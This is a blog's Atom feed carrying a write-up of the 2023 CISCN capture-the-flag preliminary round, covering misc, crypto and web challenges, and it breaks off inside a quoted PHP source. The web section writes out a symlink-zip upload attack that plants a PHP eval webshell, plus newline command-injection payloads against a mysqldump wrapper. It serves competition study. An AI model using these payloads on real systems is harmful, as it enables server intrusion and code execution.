<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lewiserii&#39;s blog</title>
  
  <subtitle>人生何处不青山</subtitle>
  <link href="https://www.lewiserii.top/atom.xml" rel="self"/>
  
  <link href="https://www.lewiserii.top/"/>
  <updated>2023-06-01T07:50:51.738Z</updated>
  <id>https://www.lewiserii.top/</id>
  
  <author>
    <name>lewiserii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023ciscn初赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023ciscn%E5%88%9D%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023ciscn%E5%88%9D%E8%B5%9Bwp.html</id>
    <published>2023-05-27T09:00:00.000Z</published>
    <updated>2023-06-01T07:50:51.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h2><p><code>print(open(&#39;/flag&#39;).read())</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E7%AD%BE%E5%88%B0%E5%8D%A1.png"></p><h2 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h2><p>追踪tcp流，数据提取出来base32</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-2.png"></p><h2 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h2><p>先分割<code>题目.png</code>中的小麻将到<code>output</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;题目.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure><p>再将<code>a.png</code>和<code>k.png</code>中的小麻将去<code>output</code>找对应的索引值，分别作为纵坐标和横坐标画图得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>python 沙盒</p><p>利用<code>_</code>拼接字符串后<code>eval</code>执行，同时限制了7位字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">Welcome to this python shell,<span class="hljs-keyword">try</span> to find the flag!<br>&gt;&gt;<span class="hljs-string">&#x27;open&#x27;</span><br><span class="hljs-string">&#x27;open&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;(&quot;/&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;fl&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/fl&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;ag&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;&quot;)&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;)&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;.&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;rea&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).rea&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;d()&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).read()&#x27;</span><br><br>&gt;&gt;<span class="hljs-built_in">eval</span>(_)<br><span class="hljs-string">&#x27;flag&#123;b8c3ead1-cdad-4ddb-bb81-9486888d426a&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>打开后有很多宽度不一样的小<code>bmp</code>文件，放进010里分析发现在冗余位多了一些数据</p><p>以<code>bfReserved1</code>表示图片左上角<code>x</code>坐标，<code>bfReserved2</code>表示图片左上角<code>y</code>坐标，<code>biXPelsPerMeter</code>表示图片右下角<code>x</code>坐标，<code>biYPelsPerMeter</code>表示图片右下角<code>y</code>坐标画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-2.png"></p><p>画的时候注意<code>biHeight</code>，在<code>bmp</code>中该值是正数说明图像是倒向的即图像存储是由下到上；该值是负数说明图像是倒向的即图像存储是由上到下，所以遇到负数的图片需要反转一下在拼图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">7200</span>,<span class="hljs-number">4000</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>)<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">38</span>:<span class="hljs-number">42</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">42</span>:<span class="hljs-number">46</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    If_rev = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(If_rev != <span class="hljs-number">100</span>):<br>        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)<br>    img.paste(pic,(Res1,Res2,Xpel,Ypel))<br>img.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拼完后的图跑<code>zsteg</code>，得到第一部分的flag：<code>flag&#123;f1R5T_part_1s_LSB_sTeG0_</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-3.png"></p><p>然后还是<code>biHeight</code>，高度-100的做0，100的做1，binary之后得到第二部分flag：<code>2nd_paRT_15_reVeRSe_bMp_</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Res1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res1_L.append(Res1)<br>    Res2_L.append(Res2)<br>    Ypel_L.append(Ypel)<br>    XY_L.append((Res2,Res1))<br>a = <span class="hljs-built_in">sorted</span>(Res1_L)<br>b = <span class="hljs-built_in">sorted</span>(Res2_L)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Ypel_L[ind] == <span class="hljs-number">4294967196</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-4.png"></p><p>第三部分在补齐字节的数据中<br>找到第一张图片<code>17447199634.bmp</code>，查看补齐字节的数据</p><p>发现依次是<code>FF D8</code>，<code>FF E1</code>等</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-5.png"></p><p>所以可以以<code>padding</code>数据按照左上到右下的顺序拼接得到<code>jpg</code>图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Xpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel_L.append(Xpel)<br>    XY_L.append((Res2,Res1))<br>    Leng_L.append((<span class="hljs-built_in">len</span>(f)-<span class="hljs-number">54</span>))<br>    Ypel_L.append(Ypel)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><br>Padding_file = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Leng_L[ind] != Xpel_L[ind]*<span class="hljs-number">300</span>):<br>        Padding_file.append(ind)<br><br>data = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Padding_file)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[Padding_file[i]]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    w = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    f = f[<span class="hljs-number">54</span>:]<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">100</span>):<br>        pad = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">200</span>):<br>        pad = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        pad = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        d = f[j*(w*<span class="hljs-number">3</span>+pad):j*(w*<span class="hljs-number">3</span>+pad)+w*<span class="hljs-number">3</span>+pad]<br>        data += d[-pad:]<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure><p>得到第三部分的flag：<code>3rd_parT_1s_paddINGINGING</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/flag.jpg"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发"></a>基于国密SM2算法的密钥密文分发</h2><p>根据文档一步一步来即可，虽然有点没看懂</p><p>先找个网址生成一组公钥和密钥 <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p><p>登录拿id</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-1.png"></p><p>上传公钥</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-2.png"></p><p>访问<code>/api/quantum</code>获取密钥密文</p><p>访问<code>/api/check</code>发送<code>quantumString</code>的值</p><p>使<code>quantumStringUser</code>的值等于<code>quantumStringServer</code>的值即可通过验证</p><p>访问<code>/api/search</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-3.png"></p><h2 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h2><p>非预期</p><p><code>/proc/22/task/22/environ</code>可以直接看到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%8F%AF%E4%BF%A1%E5%BA%A6%E9%87%8F.png"></p><h2 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h2><p>base64换表</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-Sign_in_passwd.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>上传后返回源码</p><p>只能上传<code>zip</code>文件，上传后在<code>tmp</code>目录使用<code>unzip -o</code>解压</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">//构造一个指向/var/www/html的软连接<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//保留软连接压缩<br>zip --symlinks test.zip poc<br><br>//创建跟第一个压缩包中目录同名的目录<br><span class="hljs-built_in">mkdir</span> poc<br><br>//接着向目录中写一个shell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//压缩这个目录<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure><p>上传第一个压缩包后会在<code>tmp</code>目录下生成一个软连接到<code>/var/www/html</code>，当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>根据题目描述可知分别有查询和导出的功能点</p><p>根据执行命令后的返回值推测执行的命令如下</p><p>传入<code>?db=a&amp;table_2_query=b</code>时会执行<code>select * from a.b</code><br>传入<code>?db=a&amp;table_2_dump=b</code>时会执行<code>mysqldump -u root a b &gt; log/xxx.log</code></p><p>这里因为<code>a</code>和<code>b</code>的值可控，所以相当于我们可以执行命令了</p><p>方法1：<br>直接传<code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>，然后访问<code>log/1</code></p><p>方法2：<br>因为<code>mysqldump</code>在找不到我们给出的表的情况下会抛出错误信息<code>mysqldump: Couldn&#39;t find table: &quot;表名&quot;</code></p><p>在<code>linux</code>中可以利用<code>2&gt;</code>将命令执行的结果输出到文件中</p><p>传<code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>，然后访问<code>1.php</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-dumpit-2.png"></p><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span 